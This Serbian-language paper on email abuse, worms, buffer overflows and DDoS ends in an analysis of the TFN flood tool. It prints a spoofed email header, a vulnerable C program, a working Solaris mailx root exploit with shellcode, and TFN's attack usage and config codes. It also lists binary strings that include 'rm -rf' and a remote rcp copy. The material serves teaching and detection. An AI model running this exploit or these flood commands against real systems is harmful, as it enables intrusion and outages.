U 42 države SAD sudski ovlaštene institucije mogu legalno da čitaju tuđu postu ([www.crimetime.com)](https://web.archive.org/web/20030415103235/http://www.crimetime.com%29/).

U Vašingtonu je zakonom zabranjeno slanje anonimnih poruka iako je to veoma lako izvesti pa većina ljudi nije uhvaćena u tome. Pristup elektronskoj pošti je omogućen ogromnom broju ljudi, i treba ga koristiti sa oprezom.

&nbsp;

&nbsp;

**4.2 Propaganda u komercijalne svrhe**

&nbsp;

AOL je podatke o korisnicima distribuirao i kompanijama. Podatke je prodavao marketinškim firmama putem mailing lista. Ovo nije kršenje zakona, iako su veoma specifične informacije prodate, zato što AOL tvrdi da korisnici mogu da povuku svoje ime sa liste u bilo koje vreme, samo ako to žele. Ali, ako neko ne zna da su njegovo ime i podaci prosleđeni marketinškim kompanijama, kako može da odluči da povuče svoje podatke.

Preko 70% kompanija daje lične podatke o svojim zaposlenima raznim kreditnim žirantima, 47% daje agencijama za izdavanje stanova i 19% raznim dobrotvornim organizacijama.

U zloupotrebu elektronske pošte spada i takozvano "spam"-ovanje. To predstavlja slanje velikog broja jedne poruke većem broju osoba od strane jednog pošiljaoca(najčešće su te poruke neka vrsta oglasa za proizvod ili uslugu koju pošiljalac želi da nam proda).

Problem SPAM-a spada u oblast Net-etike - kulture ponašanja i komunikacije na Internetu. Šta je dozvoljeno i u kojoj meri često se ne zna - baš kao i u realnom životu. Poruke koje svaki email korisnik svakodnevno prima mogu biti zaista iritirajuće, kako po svom sadržaju tako i samim znanjem da te poruke nismo tražili, te da nas neko koristi kako bi izvukao neku korist. Postojanje zakona je svakako jedan od načina zaštite korisnika i provajdera. Mnogi provajderi vode računa o pošti koju distribuiraju do krajnjih korisnika, ali ima i onih koji ostavljaju korisnicima da se sami izbore.

&nbsp; Specifičan način spam-ovanja je slanje puno e-mailova na određenog korisnika.

Na taj način se osim zatrpavanja "mete" beskorisnim porukama, zauzimaju resursi računara koji se koristi za slanje ili primanje tih poruka, pa moze doći i do blokiranja ili čak do oštećenja samog sistema.

Primer za to se video prilikom NATO bombardovanja Jugoslavije gde su određeni serveri koji su prikazivali web prezentacije o NATO-u bili onesposobljeni primanjem preko 20.000 email poruka svakog sata. U jednom trenutku sam server više nije imao mesta gde da primi tolike poruke i srušio se usled nedostatka mesta za snimanje privremenih podataka neophodnih za rad sistema.

&nbsp; Ovaj vid zloupotrebe je danas dostupan ne samo "velikim hakerima", već i običnim korisnicima Interneta. Danas 30% populacije na Internetu ima po neki program koji omogućava ovakvo bombardovanje nekoga gomilom poruka, jer se mogu naći na Internetu i veoma su jednostavni za upotrebu.

**4.3 Lažno predstavljanje putem elektronske pošte**

&nbsp;

Postoji još jedan važan aspekt, a to je da elektronska pošta nije realna, već virtualna konverzacija, i kao takva može biti loše interpretirana i shvaćena na pogrešan nacin. To dolazi do posebnog izražaja ako se neovlašćeno koristi od treće strane.

&nbsp;

Dodatni način zloupotrebe e-maila predstavlja slanje "fake-mail"-ova. U pitanju je slanje poruka tako da izgleda da ih je poslao neko drugi. Najčešće se jedino iz zaglavlja poruke može otkriti da poruku nije poslao onaj čije ime piše u poruci, tako da ako ne očekujete suprotno, možete da pomislite da je poruku poslao onaj u čije je ime poslata.

U te svrhe se može iskoristiti najobičniji mail program kao što su "Outlook Express", "Internet Mail", "Eudora", "Netscape Messager" ili je potrebno samo malo predznanja o radu samih mail servera i operativnog sistema linux.

&nbsp;

Primer jedne poruke koja na prvi pogled izgleda normalno:

\-----------------------------------------------------------------------------------------

From <lazni@eunet.yu> Thu May 18 08:44:37 2000

Date: Thu, 18 May 2000 08:56:38 +0200

From: <lazni@eunet.yu>

Subject: Lazna poruka

&nbsp;

Mala demonstracija kako se salju lazne poruka

\--------------------------------------------------------------------------------------

Ako bolje pogledamo u Zaglavlje te poruke shvatićemo da ona nikad i nije bila poslata sa euneta i da je lažna

&nbsp;

\--------------------------------------------------------------------------------------Received: from amadeus.uni-bk.ac.yu (amadeus.uni-bk.ac.yu \[194.247.207.33\]

&nbsp; by amadeus.uni-bk.ac.yu (qmail invoked from network)withESMTP id IAA14979

&nbsp; for &lt;<xxx-x@amadeus.uni-bk.ac.yu>&gt;; Thu, 18 May 2000 08:44:21 +

&nbsp;

From: <lazni@eunet.yu>

Received: from localhost (localhost \[127.0.0.1\])

&nbsp; by amadeus.uni-bk.ac.yu (qmail invoked from network) with SMTP id IAA21723

&nbsp; for <xxx-x@amadeus.uni-bk.ac.yu>; Thu, 18 May 2000 08:56:38 +02

Date: Thu, 18 May 2000 08:56:38 +0200

Message-Id: &lt;<200005180656.IAA21723@amadeus.uni-bk.ac.yu> &gt;

X-Authentication-Warning: amadeus.uni-bk.ac.yu: localhost \[127.0.0.1\]

Subject: Lazna poruka

&nbsp;

&nbsp;

Ključne stavke su

&nbsp;

Received: from localhost (localhost \[127.0.0.1\])

&nbsp; by amadeus.uni-bk.ac.yu (qmail invoked from network) with SMTP id IAA21723

&nbsp; for <xxx-x@amadeus.uni-bk.ac.yu>; Thu, 18 May 2000 08:56:38 +02

X-Authentication-Warning: amadeus.uni-bk.ac.yu: localhost \[127.0.0.1\]

&nbsp;

Primer 1

&nbsp;

&nbsp;

&nbsp; U stavci Received vidi se da je mail stvarno poslat preko mail servera na amadeusu i to tako što je poslat mail sa njega samog(localhost).Kada se primi jedan ovakav mail potrebno ga je poslati nazad na abuse@imeprovidera_odakle_je_mail ili root@imeprovidera_odakle_je_mail sa konstatacijom da je mail lažan i da tražite od administratora sistema da reaguje na zloupotrebe mail servera.

&nbsp;

&nbsp;

**4.4 Korišćenje e-maila kao oblik distribuiranog napada**

&nbsp;

&nbsp; Mail bombardovanje je veoma primitivna tehnika, pa se gotovo više i ne koristi. Skoro svi provajderi imaju zaštitu od mail bombi (server odmah zaustavi mailove ako primeti da dolaze iste poruke) a i krajnja zaštita je jednostavna - za manje od 5 minuta ćete ih obrisati, dok će zlonamerni korisnik potrošiti sate i sate da bi vam poslao par hiljada poruka.

Zbog toga se koristi nova tehnika, a to je slanje emaila koji može naneti (i obično donosii) veliku štetu. Radi se slanju trojanca ili virusa uz email u kojem se zlonamerni korisnik predstavlja kao veoma dobrotvorna osoba i neprimetno moli primaoca da startuje 'program' koji mu je poslao. Program je najčešće zaražen nekom vrstom virusa među koje najčešće spadaju

BackOrifice i NetBus, dva najpopularnija trojanca ( analogija izvedena po tome što zlonamernom korisniku dozvoljava da se bez znanja vlasnika računara "useli" na zaraženi računar i time zlonamernom korisniku dozvoli nelegalan pristup računaru) koji kreiraju takozvani backdoor (eng. backdoor - zadnja vrata).

&nbsp; Pored trojanaca opasnost predstavljaju i virusi koji se šire putem emaila, tzv. crvi. Takvi virusi prate kome sve žrtva šalje pisma, i uz njihove emailove prikače i svoju kopiju, tako da primalac pisma dobije virus od svog prijatelja.

Zato je potrebno biti obazriv kada se prima mail poruka sa prikačenim programom. Posebno treba obratiti pažnju na dva nova tipa crva, a to su crvi iz porodice takozvanih 'VBA crva' čiji je predstavnik sada već čuveni crv 'I-LOVE'YOU' i crvi iz porodice 'ActiveX crva' koju predstavlja crv 'BubbleBoy'.

&nbsp; VBA crvi koriste posebnu tehniku kako bi zavarali potencijalnu žrtvu. Pored toga što crv nema ekstenziju EXE već VBA ili VBS (što znači da su pisani u Visual Basic Script formatu i da je za njihovo izvršavanje potreban IE), takvi crvi se obično distribuiraju sa extenzijom '.txt.vba', tako da potencijalna žrtva pomisli da se radi o običnom tekstu i startuju fajl. Pošto je zadnja ekstenzija '.vba', ne startuje se Notepad već IE koji izvrši program, tako da potencijalna žrtva postane prava žrtva.

Posle crva 'I-LOVE-YOU', koji se širi sa fajlom 'LOVE-LETTER-FOR-YOU.TXT.vbs', pojavilo se još nekoliko stotina prepravljenih verzija ovog crva, među kojima je i srpska verzija koja se zove 'Volim i ja Vas.txt.vbs'.

&nbsp; Specijalna vrsta zlonamernih email poruka su poruke koje koriste Java/ActiveX aplete da bi ubacili trojanca ili obrisali fajlove po disku. Aplet koji nosi takvo jedno pismo se izvrši čim ga korisnik otvori, tako da nije više ni potrebno da startujete prikačeni fajl - on se sam startuje!

Takav email može (bez startovanja pomoćnog EXE fajla) brisati fajlove, kopirati, i kreirati nove, prosto rečeno, aplet ima sve privilegije i može se 'ugnjezditi' u sistem, kako bi kasnije preduzeo neke nove akcije.

Takav jedan aplet nosi crv 'BubbleBoy' koji se kao i svi crvi širi putem emaila. Dovoljno samo da neoprezni korisnik otvori e-mail i postaće žrtva koja će svojom nepažnjom poslati kopiju crva na još nekoliko stotina emaila.

To je samo jedna mogućnost ovakvih mail poruka. Naime, taj aplet može startovati prikačeni fajl, koji će u ovom slučaju preuzeti punu kontrolu nad računarom primaoca i otvoriće zlonamernom korisniku 'zadnja vrata'.

&nbsp;

&nbsp;

**4.5 Neovlašćeno ulaženje na računarski sistem**

&nbsp;

&nbsp; Neovlašćen pristup računarskom sistemu se najčešće svodi na korišćenje i zloupotrebu neke vrste sigurnosne rupe u samom sistemu.

Najčešće se to svodi na pravljenje i korišćenje exploita (programi pisani da iskoriste postojanje sigurnosne rupe u nekom sistemskom programu i dozvole onom ko je pokrenuo exploit da dobije neovlašćene privilegije na sistemu)

Najčešće korišćena metoda prilikom pravljenja exploita je klasičan buffer overflow.

Naime buffer overflow je prepunjavanje buffera i pisanje po prostoru po kom ne bi smelo da se piše u normalnim okolnostima.Ali šta se time dobija? Šta se može postići?

Evo i prostog programa koji u sebi sadrži klasičan buffer overflow:

&nbsp; &lt;++&gt; vuln.c  
 int main(int argc,char \*\*argv){  
 char buf\[256\];  
 strcpy(buf,argv\[1\]);  
 printf("passed : %s\\n",buf);  
 }  
 &lt;--&gt; vuln.c

&nbsp;

program 1

&nbsp;

&nbsp; Svaka funkcija koja se poziva mora da se vrati na mesto svog poziva.To se radi tako što se pri pozivu funkcije sa instrukcijom call na stacku sačuva EIP koji će se na kraju funkcije pokupiti i vratiti na mesto poziva.

&nbsp; Kako je main() funkcija i ona će biti pozvana (disass \_start) i njen EIP će biti sačuvan negde na stacku.Na samom kraju funkcija nalazi se instrukcija ret koja će sačuvan EIP sa stack-a da pokupi i da se na taj način vrati odakle je pozvana. Međutim zbog specifičnosti samog rada sa memorijom i rada sa stackom (stack na i386 raste na dole) situacija u kojoj bi string bio veći od prostora koji smo mu dodelili definišući mu buffer (u ovom slučaju 256 byte) izazvao bi rušenje integriteta memorije jer bi preostali deo stringa (preko 256 byte) prepisao u memoriji i mesto gde je zapisan EIP ispuniti string karakterima i time izazvati pad programa kada na kraju funkcija pokrene ret da u EIP upiše string karaktere. Međutim, ako u EIP namerno upišemo adresu shell coda (tačnije prepuni buffer sa shell codom i čekamo da ga ret pokupi) i rezultat pada programa biće novi shell koji će se pokrenuti. Ako je program bio SUID (imao privilegije super korisnika (Super User ID)) dobićemo privilegije root-a na toj mašini i samim tim postati korisnik sa administratorskim privilegijama. Primer jednog klasičnog exploita koji se može koristiti na sistemima Sun Solaris kojim korisnik koji ga pokrene dobija efektivni root access.

&nbsp;

&nbsp;

&nbsp;

id=6.#include &lt;fcntl.h&gt;

int main(int ac, char \*\*av)

{

char shell\[\]=

&nbsp; "\\x90\\x10\\x20\\x06\\x82\\x10\\x20\\x88\\x91\\xd0\\x20\\x08" /\* setegid(6) \*/

&nbsp; "\\x90\\x10\\x20\\x06\\x82\\x10\\x20\\x2e\\x91\\xd0\\x20\\x08" /\* setgid(6) \*/

&nbsp; "\\x90\\x08\\x3f\\xff" /\* and %g0,-1,%o0 \*/

&nbsp; "\\x82\\x10\\x20\\x17" /\* mov 0x17,%g1 \*/

&nbsp; "\\x91\\xd0\\x20\\x08" /\* ta 8 \*/

&nbsp; "\\x20\\xbf\\xff\\xff" /\* bn,a &lt;shellcode-4&gt; \*/

&nbsp; "\\x20\\xbf\\xff\\xff" /\* bn,a &lt;shellcode&gt; \*/

&nbsp; "\\x7f\\xff\\xff\\xff" /\* call &lt;shellcode+4&gt; \*/

&nbsp; "\\x90\\x03\\xe0\\x20" /\* add %o7,32,%o0 \*/

&nbsp; "\\x92\\x02\\x20\\x10" /\* add %o0,16,%o1 \*/

&nbsp; "\\xc0\\x22\\x20\\x08" /\* st %g0,\[%o0+8\] \*/

&nbsp; "\\xd0\\x22\\x20\\x10" /\* st %o0,\[%o0+16\] \*/

&nbsp; "\\xc0\\x22\\x20\\x14" /\* st %g0,\[%o0+20\] \*/

&nbsp; "\\x82\\x10\\x20\\x0b" /\* mov 0xb,%g1 \*/

&nbsp; "\\x91\\xd0\\x20\\x08" /\* ta 8 \*/

&nbsp; "/bin/ksh";

&nbsp;u_long get_sp(void)

&nbsp; { \__asm_\_("mov %sp,%i0 \\n"); }

&nbsp;unsigned long magic = get_sp() + 1444 ; /\* default offset \*/

&nbsp;unsigned char buf\[1220\];

&nbsp;char \*envi;

&nbsp;int cont;

&nbsp;

&nbsp;envi = (char \*)malloc(1000\*sizeof(char));

&nbsp;for (cont=3;cont<990;cont=cont+4)

&nbsp; { envi\[cont\]= 0xa6;envi\[cont+1\]=0x1c;envi\[cont+2\]=0xc0;envi\[cont+3\]=0x13; }

&nbsp; for (cont=803;cont<803+strlen(shell);++cont) envi\[cont\]=shell\[cont-803\];

&nbsp; memcpy(envi,"SO=",3);

&nbsp;envi\[999\]=0;

&nbsp;putenv(envi);

&nbsp;memset(buf,0x41,1220);

&nbsp;memcpy(buf+1120+24,&magic,4); /\* fake %fp \*/

&nbsp;memcpy(buf+1120+28,&magic,4); /\* fake %i7 \*/

&nbsp;buf\[1220\]=0;

&nbsp;execl("/usr/bin/mailx","mailx","-F",buf,NULL);

}

&nbsp;

&nbsp;

program 2

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

U skorašnje vreme postoji programski paket pod imenom "libsafe" (<http://www.research.avayalabs.com/project/libsafe/>) koji služi za zaštitu kritičnih elemenata stack-a za svaki program koji je startovan unutar operativnog sistema baziranih na UNIX platformama ."Libsafe" radi na principu terminacije, odnosno ukoliko dođe do prepisivanje stack-a "libsafe" automatski terminiše odnosno nasilno isključi taj program. Jedina mana paketa "Libsafe" jeste što je ograničen na UNIX platforme, što platforme tipa WINDOWS ostavlja u oskudici.

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

**5\. DDOS**

&nbsp;

**5.1 DDOS pojam**

&nbsp;

&nbsp; Distribuirani DOS, kao i bilo koji distribuirani koncept predstavlja način kako pokrenuti određenu proceduru sa nekoliko računara. U ovom slučaju to je uskraćivanje servisa (denial of service) u formi preplavljivanja paketima, a u cilju opterećivanja mreža odnosno linkova radi njihovog onesposobljavanja. DDOS ne predstavlja kategoriju alata za hakovanje već način razmisljanja. Međutim kao i svaki informatički koncept propraćen je alatima koji opravdavaju ovaj način razmisljanja. DDOS alati predstavljaju PENETRACIONE alate , oni ne eksploatišu sigurnosne rupe odnosno ranjivosti ali mogu da ispitaju koliku količinu saobraćaja jedan računar , mreža mogu ili nemogu da podnesu .DDOS se već duže vreme koristi od strane profesionalnih konsultanata za sigurnost kao sredstvo za testiranje izdržljivosti mreža. Pre nego što su izašli DDOS alati , postojali su komercialini alati koji su mogli da pokrenu takozvano distribuirano preplavljivanje paketima. Ti alati su korišćeni u okviru preduzeća koja se bave sigurnošću da bi mogli da primene sigurnosni servis koji se naziva ˝Capacity Management˝ . Svrha ˝Capacity Management˝ je da se utvrdi koliku količinu saboraćaja može da podrži jedna mreža , i da se utvrdi da li se propusna moć mete u ovom slučaju mreže koja se testira mora poboljšati ili da li ona može da izdrži tu količinu saobraćaja a pri tome da može da pruža usluge koje se nalaze na toj mreži odnosno meti.

&nbsp;

**5.2 Za šta se DDOS može koristiti ?**

&nbsp;

&nbsp; On može da preoptereti mrežne linkove. On šalje bezsmislene pakete, pri čemu je količina paketa i suviše velika da bi neka mreža mogla to da primi i obradi, tako da je jedino za šta se može koristiti DDOS jeste onemogućavanje pristupa mreži i samim uslugama koje ta mreža pruža.

&nbsp;

&nbsp;

&nbsp;

&nbsp;

**Skorašnji primer DDOS napada izvod iz "BLICA"**

&nbsp;

&nbsp; _Napadnut "Telekomov" link_

_Kada je podignuta cena impulsa, grupa nezavisnih hakera je počela da pretražuje „Telekomov" link, vršeći smurf ili tzv. DDOS napad. Time prekidaju njihov link i nanose im ogromnu štetu, jer ih onemogućavaju u komunikaciji. Napad ide preko servera iz inostranstva, na primer u Papua Novoj Gvineji, sa Sejšela i slično, zbog čega „Telekom" ne može da im uđe u trag. Mi se od toga ograđujemo, ali to govori o nezadovoljstvu korisnika Interneta i o kontraefektima poskupljenja_

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

**5.3 Kako on radi ?**

&nbsp;

&nbsp; Osnovna ideja je da se instalira ogromna količina DOS servera na različitim računarima , koji čekaju komande od centralnog klijenta .U trenutku kada centralni klijent da komandu da generišu onoliko saobraćaja koliko to želi napadač i usmere ga ka jednoj mreži , alat distribuira komande serverima da generisan saobraćaj puste ka određenoj mreži i na taj način otpočnu uskraćivanje usluga .Iz ovih razloga se ovaj metod naziva distribuirano uskraćivanje usluga. Pre nego sto su ovakvi alati napravljeni onaj koji napada ili onaj koji testira mrežu u cilju zastite od takvih napada je morao da se telnetuje1 na sve masine sa kojih želi da izvrši napad ili da izvrši testiranje mreže i manuelno da otpočne napad na željenu mrežu koristeći UNIX komandu ping2 -f mreža

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp; **6.0 Detaljan opis DDOS**

**alata (TFN project)**

&nbsp;

&nbsp;

**6.1 Intro**

&nbsp;

&nbsp; U ovom delu je data analizu "Tribe Flood Network" alata ili popularnije nazvanog "TFN", koji je kreirao "Mixter". TFN se trenutno razvija i testira na mnogobrojnim kompromitovanim računarima bazarianih na Unix sistemima .

&nbsp;

&nbsp; TFN je sastavljen na principu klijent-server tehnologije koji se implementuje kao alat za distribuirano uskraćivanje usluga.Kao takav sposoban je da izvršava sledeće oblike napada:

&nbsp;

· ICMP flood

· SYN flood

· UDP flood

· Smurf

· Pružanje "root konzole po zahtevu" na određenom portu

&nbsp;

TFN serveri su prvobitno nađeni u binarnoj formi na Solaris 2.x sistemima, koji su indetifikovani kao kompromitovani sistemi, exploatisani sa **buffer overrun** bagom u RPC servisima "statd","cmsd" i "ttdbserverd". Ovaj **buffer overrun** je opisan na CERT-ovom web sajtu incident 99-04:

&nbsp; <http://www.cert.org/incident_notes/IN-99-04.html>

&nbsp;

&nbsp; U početku je postojalo verovanje da su ovi server korišćeni kao neki od programa koji služe za prisluškivanje ili za daljinsko upravljanje. Tokom istrage koristeći razne alate za analizu i zastitu od upada došlo se do zaključka da je ovo jedan od alata za distribuirano uskraćivanje usluga ,koji je baziran na alatu **trinoo** koji takođe služi za distribuirano uskraćivanje usluga, a čiji se izvorni kod nalazio na jednom ukradenom nalogu koji je bio korišćen za bekapovanje logova.

&nbsp; Treba napomenuti da sem **TFN** i **TRINOO** postoje i drugi alati kao na primer :

· stacheldracht (veoma sličan alat TFN-u)

· papasmurf (koristi samo smurf kao oblik napada)

· fraggle (koristi samo UDP flood kao oblik napada)

· winsmurf (koristi samo smurf kao oblik napada win32 verzija)

· jolt (syn flood alat koji za razliku od prethodnih neradi na principu klijent- server već je stand'alone alat)

&nbsp;

&nbsp;

**6.2 Izvršni kod ("verzije 1.3 build 0053") TFN servera**

&nbsp;

&nbsp; Modifikacijom izvršnog koda može se promentiti bilo koji od detalja ove analize kao što su konzole šifre komande TCP/UDP portovi kao i podržani metodi napada.

&nbsp;

U ovo slučaju oba dela TFN alata server i klijent su kompajlirani i pokretani sa Red Hat Linux 6.0 operativnog sistema.

&nbsp;

&nbsp;

Za analizu inicjalnog upada pogledaćemo strukturu jedne **TFN** mreže

&nbsp;

**Mreža: napadač(i)-->klijent(i)-->server(i)-->Žrtva(e)**

&nbsp;

&nbsp;

&nbsp; TFN mreža je sastavljena od **tribe** klijent programa ("tribe.c")i **tribe** server programa ("td.c") gde računari na kojima se instaliraju ovi serveri se podrazumevaju.

&nbsp;

+----------+ +----------+

| napadač | | napadač |

+----------+ +----------+

| |

. . . --+----------------------+-----------------------+-- . . .

| | |

| | |

+----------+ +----------+ +----------+

| klijent | | klijent | | klijent |

+----------+ +----------+ +----------+

| | |

| | |

. . .---+------+-----+------------+------------+------------+---- . . .

| | | | |

| | | | |

+--------+ +--------+ +--------+ +--------+ +--------+

| server | | server | | server | | server | | server |

+--------+ +--------+ +--------+ +--------+ +--------+

|

+----------+

| Žrtva |

+----------+

&nbsp;

šema 1

&nbsp;

&nbsp;

&nbsp;

&nbsp; Napadač(i) kontrolišu jednog ili više klijenata od kojih svako kontroliše više servera . Serverima je naloženo da koordinišu napad na jednu ili više žrtava, gde pod žrtvama podrazumevamo jedan ili više računara kao i jednu ili više mreža, od strane klijenata.

&nbsp;

&nbsp;

**6.3 Komunikacija između klijenta i servera**

&nbsp;

&nbsp; Daljinsko upravljanje TFN mrežom otpočinje na komandnoj liniji. Izvršavajući **tribe** klijent program uspostavljamo konekciju na **tribe** servere jednom od brojnih metoda kao što su:

&nbsp;

· klijent-server vezivanje bazirano na TCP protokolu

· klijent-server vezivanje bazirano na UDP protokolu

· klijent-server vezivanje bazirano na ICMP protokolu

· SSH konekcijama

· Telnet konekcijama

&nbsp;

&nbsp; Za vezivanje klijenta sa serverom nije potrebno imati šifru ukoliko nećete da mrežu koju ste oformili čuvate samo za sebe, mada je potrebno imati takozvanu "ip listu" koja sadrži spisak TFN servera sa njihovim Internet adresama.

&nbsp;

&nbsp; Komunikacija između klijenta i TFN servera se ostvaruje sa ICMP_ECHOREPLY paketima što znači da se TCP i UDP protokoli koriste samo pri uspustavljnju konekcije a ne pri komunikaciji, razlog za to je što većina alata za monitoring ne prikazuju količinu ICMP_ECHOREPLY paketa koja prolazi kroz mrežu ili nemogu da vide šta se sadrži u paketu koji je baziran na icmp protokolu ,što monitoring između klijenta i servera skoro čini nemogućim sa standardnim alatima.

&nbsp;

&nbsp; U prilogu A su prikazane zakrpe za verziju Sniffit 0.3.7.beta koja omogućava da prikaže ICMP data segmente,i prilog B za zakrpe za "tcpshow.c" 1.0 da prikažu ICMP_ECHO i ICMP_ECHOREPLY identifikacione i sekvencianlne brojeve.

&nbsp;

**6.4 Pokretanje klijent programa**

&nbsp;

Kada pokrenemo program bez ikakvih opcija dobijamo pomoćni ekran koji prikazuje komande koje su podržane od strane TFN-a i koji izgleda ovako:

&nbsp;

&nbsp;

&nbsp; \[tribe flood network\]

&nbsp;

&nbsp; usage: ./tfn &lt;iplist&gt; &lt;type&gt; \[ip\] \[port\]

&nbsp; &lt;iplist&gt; contains a list of numerical hosts that are ready to flood

&nbsp; &lt;type&gt; -1 for spoofmask type (specify 0-3), -2 for packet size,

&nbsp; is 0 for stop/status, 1 for udp, 2 for syn, 3 for icmp,

&nbsp; 4 to bind a rootshell (specify port)

&nbsp; 5 to smurf, first ip is target, further ips are broadcasts

&nbsp; \[ip\] target ip\[s\], separated by @ if more than one

\[port\] must be given for a syn flood, 0 = RANDOM

&nbsp;

&nbsp;

slika 5

&nbsp;

&nbsp;

U prvoj liniji "./tfn &lt;iplist&gt; &lt;type&gt; \[ip\] \[port\]" nam je dato sledeće:

&nbsp;

· **iplist** predstavlja numeričku listu TFN servera ili broadcast servera složenu po njihovim Internet adresama. U zavisnosti od toga kakva je vrsta napada koristimo određenu vrstu iplista .Ukoliko je vrsta napada **SYN-flood**,**ICMP-flood** ili **UDP-flood** u tom slučaju se koriste liste TFN servera ,a ako je vrsta napada **Smurf** tada se koriste TFN ili "broadcast liste"

· **type** predstavlja prekidač koji određuje vrstu napada kao i tkz "spoof protection" odnosno maskiranje polazne adrese ,određuje veličinu paketa i određuje dobijanje root-shella na određenom portu.

· **IP** u ovom slučaju predstavlja odredišnu adresu odnosno metu. **Meta** može biti jedna ili više adresa odnosno metu može predstavljati jedan računar ili cela mreža.

· **port** koristeći ovu opciju možemo odrediti obaranje nekog određenog sevisa koji se korist na jednom računaru kao naprimer port 80 za web ,port 25 za mail, portovi 6667-7000 za irc itd. Ukoliko želimo da zagušimo saobraćaj onda se portovi randomno određuju u rasponu od 0-65535.

&nbsp;

&nbsp; Ukoliko smo se odlučili za računar ili mrežu i odlučili za vrstu napada podesivši ove parametre koje ovaj program zahteva možemo otpočeti napad na željenu mrežu.Veoma je mali broj mreža danas na internetu koje su uspele da se odbrane od ovakvih vidova napada.Jedini razlozi za neuspelost odbrane od ovakvih napada jeste neshvatnje ovog problema kao ozbiljnog i količina novca koja se ulaže u sigurnost jedne mreže.

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

**6.5 Zaštita šiframa**

&nbsp;

&nbsp; Pošto klijent nije zaštićen šifrom za pristup svaka komanda koja se šalje serverima nije šifrovana .Da bi se postigao neki vid enkripcije odnosno zaštite šifrom komande su poslate u vidu 16-to bitnih brojeva koje su sakrivene u indetfikacionom polju ICMP_ECHOREPLY packeta.Broj ove sekvence je konstanta 0x0000, koji liči kao odgovor na standardnu ping komandu.

&nbsp;

&nbsp;

Ovo je primer standardnog "config.h" fajla koji ide uz TFN paket.

&nbsp;

&nbsp;

# ifndef \_CONFIG_H

&nbsp;

/\* user defined values for the teletubby flood network \*/

&nbsp;

# define HIDEME "tfn-daemon"

# define HIDEKIDS "tfn-child"

# define CHLD_MAX 50

&nbsp;

/\* #define ATTACKLOG "attack.log" keep a log of attacks/victims on all

&nbsp; hosts running td for debugging etc. (hint: bad idea) \*/

&nbsp;

/\* These are like passwords, you might want to change them \*/

&nbsp;

# define ID_ACK 123 /\* for replies to the client \*/

# define ID_SHELL 456 /\* to bind a rootshell, optional \*/

# define ID_PSIZE 789 /\* to change size of udp/icmp packets \*/

# define ID_SWITCH 234 /\* to switch spoofing mode \*/

# define ID_STOPIT 567 /\* to stop flooding \*/

# define ID_SENDUDP 890 /\* to udp flood \*/

# define ID_SENDSYN 345 /\* to syn flood \*/

# define ID_SYNPORT 678 /\* to set port \*/

# define ID_ICMP 901 /\* to icmp flood \*/

# define ID_SMURF 666 /\* haps! haps! \*/

&nbsp;

# define \_CONFIG_H

# endif

&nbsp;

primer 2

&nbsp;

&nbsp; Kao što se vidi u ovom primeru "config.h" svi brojevi u srednjoj koloni predstavljaju šifre za pokretanje određene vrste napada te je preporučljivo da se ti brojevi menjaju ukoliko želite da zaštite vašu TFN mrežu da neko sem vas samih nemože da koristi komande ukoliko je ta mreža napravljena kao sredstvo koje bi služilo da se proveri propusni opseg same mreže na kojoj se takva vrsta servisa nalazi.

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

**6.6 Tragovi (Fingerprints)**

&nbsp;

&nbsp; Kao i sa trinoo paketom, metodi za instaliranje klijent/server TFN programa su isti kao i kod vecine UNIX/LINUX operativnih sistema sa svim standardnim opcijama za sakrivanje programa i njegovih pratecih fajlova.

&nbsp;

&nbsp; Oboje klijent i server moraju biti pokrenuti sa superuser (root) privilegijama iz razloga sto koriste neke kernel datoteke koje samo superuser može da koristi.

&nbsp;

&nbsp; Skorašnje instalacije TFN servera uključuju stringove koje indiciraju da je autor istoimenog paketa uključio i enkripcione module poput modula BLOWFISH koji omogućuje da se enkriptuju ip liste servera što detekciju samih TFN server čini težom

&nbsp;

Primer stringova koji su uključeni unutar skoro nađenog TFN servera na univerzitetu u Washingtonu

&nbsp;

&nbsp;

blowfish_init

blowfish_encipher

blowfish_decipher Funkcije za Enkripciju

encrypt_string

decrypt_string

&nbsp;

serverworks

readmservers

addnewmserver Funkcije za kontrolu servera

delmserver

servcounti

&nbsp;

icmp2

udppsize

icmpsize

spoofing

spooftest

commence_icmp Funkcije koje određuju tip napada

commence_udp

commence_syn

floodtime

floodruns

&nbsp;

bind

setsockopt Funkcije za Remote shell(daljinski prisupt)

listensocket

&nbsp;

&nbsp;

k00lip

fw00ding

k00lntoa

tc: unknown host

rm -rf %s

ttymon

rcp %s@%s:sol.bin %s Komande koje služe za osnovne operac-

nohup ./%s ije sa fajlovima kao i sa kontrolom ostalih nezavisnih programa

&nbsp;

prikaz 1

&nbsp;

&nbsp;

&nbsp;

**6.7 Prikaz aktivnosti TFN servera sa različitim paketima za praćenje saobraćaj kao i aktivnih procesa**

&nbsp;

&nbsp; "Lsof" koristimo da ispitamo postojeće procese na računaru, gde prilikom listanja aktivnih programa utvrdili da li je podignut TFN server. Kada to uradimo primetićemo otvorene konekcije nespecifikovanog protokola. To nam govori da se na našim računarima nalazi ovakav jedan maliciozni servis i što pre treba raditi na njegovom uklanjanju.

&nbsp;

td 5931 root cwd DIR 3,5 1024 240721

/usr/lib/libx/...

td 5931 root rtd DIR 3,1 1024 2 /

td 5931 root txt REG 3,5 297508 240734

/usr/lib/libx/.../td

